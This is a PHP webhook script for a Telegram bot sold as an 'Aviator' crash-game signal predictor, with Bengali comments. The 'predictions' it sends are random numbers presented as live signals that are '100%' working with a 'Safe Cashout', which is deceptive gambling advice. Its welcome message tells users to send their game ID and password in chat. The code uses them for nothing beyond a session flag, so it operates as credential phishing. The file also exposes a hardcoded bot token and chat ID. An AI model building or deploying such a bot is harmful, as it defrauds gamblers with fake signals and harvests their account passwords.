<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// কনফিগারেশন
$botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";
$chatId = "6109947429"; // এখানে আপনার আসল ID দিন (যেমন: 12345678)

$input = file_get_contents('php://input');
$data = json_decode($input, true);

// সিগন্যাল প্রসেসিং
if (isset($data['multiplier'])) {
    $last = floatval($data['multiplier']);
    
    // সিগন্যাল আসার আগে অবশ্যই লগইন চেক করবে
    if (file_exists('user_session.json')) {
        $prediction = ($last < 1.8) ? rand(250, 600)/100 : rand(110, 210)/100;
        
        $msg = "🚀 **NEW SIGNAL (LIVE)** 🚀\n";
        $msg .= "----------------------------\n";
        $msg .= "📊 Last Round: " . $last . "x\n";
        $msg .= "🎯 Prediction: " . round($prediction, 2) . "x\n";
        $msg .= "💰 Safe Cashout: " . round($prediction * 0.85, 2) . "x\n";
        $msg .= "✅ Status: Working 100%";

        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
        file_get_contents($url);
        
        echo json_encode(["status" => "signal_sent"]);
    } else {
        echo json_encode(["status" => "login_required"]);
    }
}

// টেলিগ্রাম থেকে আসা /start কমান্ড হ্যান্ডেল
if (isset($data['message'])) {
    $text = $data['message']['text'];
    $uChatId = $data['message']['chat']['id'];
    
    if ($text == "/start") {
        $welcome = "🚀 **Welcome to R8rAIHAN Aviator Bot**\n\nOwner: R8rAIHAN\nBot Work 100%✅\n\nসিগন্যাল পেতে আপনার গেম আইডি পাসওয়ার্ড দিয়ে লগইন মেসেজ দিন।";
        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$uChatId&text=".urlencode($welcome)."&parse_mode=Markdown");
    }
    
    // আইডি পাসওয়ার্ড সেভ করা
    if (str_contains(strtolower($text), 'id') && str_contains(strtolower($text), 'password')) {
        file_put_contents('user_session.json', json_encode(['auth' => true]));
        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$uChatId&text=".urlencode("✅ Login Successful! এখন থেকে অটো সিগন্যাল পাবেন।"));
    }
}
?>
